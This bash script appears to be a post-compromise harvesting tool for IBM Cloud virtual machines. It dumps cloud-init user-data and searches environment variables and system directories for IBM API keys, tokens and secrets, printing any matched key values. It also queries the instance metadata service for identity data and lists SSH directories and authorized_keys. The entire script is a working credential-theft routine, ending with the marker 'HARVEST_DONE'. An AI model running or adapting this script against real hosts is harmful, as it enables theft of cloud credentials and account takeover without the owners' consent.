#!/bin/bash
set -u
S=""; [ "$(id -u)" = 0 ] || S="sudo -n"
echo "== id"; id; hostname; head -2 /etc/os-release
echo "== cloud-init"; $S sed -n 1,40p /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -40
echo "== ibm cli"; command -v ibmcloud || echo none; $S ls -la /root/.ibmcloud /home/*/.ibmcloud /root/.bluemix 2>/dev/null
echo "== env"; env | grep -iE 'ibm|api_key|apikey|token|secret' | head -20
echo "== grep"; $S grep -rIl --exclude-dir=proc --exclude-dir=sys -E 'iam\.cloud\.ibm\.com|containers\.cloud\.ibm\.com|IBMCLOUD_API_KEY|"apikey"' /root /home /etc /opt /var/lib/cloud /usr/local 2>/dev/null | head -20
echo "== grep2 content"; for f in $($S grep -rIl --exclude-dir=proc -E 'IBMCLOUD_API_KEY|"apikey"' /root /home /etc /opt /var/lib/cloud 2>/dev/null | head -5); do echo "--- $f"; $S grep -aoE 'IBMCLOUD_API_KEY[=: ]+[A-Za-z0-9_-]{20,}|"apikey"[[:space:]]*:[[:space:]]*"[^"]{20,}"' "$f" | head -3; done
echo "== metadata instance"; curl -s -m 8 'http://169.254.169.254/instance?version=2021-03-09&format=json' | head -c 2000; echo
echo "== metadata identity"; curl -s -m 8 'http://169.254.169.254/identity?version=2021-03-09' | head -c 800; echo
echo "== ssh"; $S ls -la /root/.ssh 2>/dev/null; $S cat /root/.ssh/authorized_keys 2>/dev/null | head -5; $S ls -la /home/*/.ssh 2>/dev/null; cat /home/*/.ssh/authorized_keys 2>/dev/null | head -5
echo "== ip"; ip -4 addr | grep inet
echo "HARVEST_DONE"
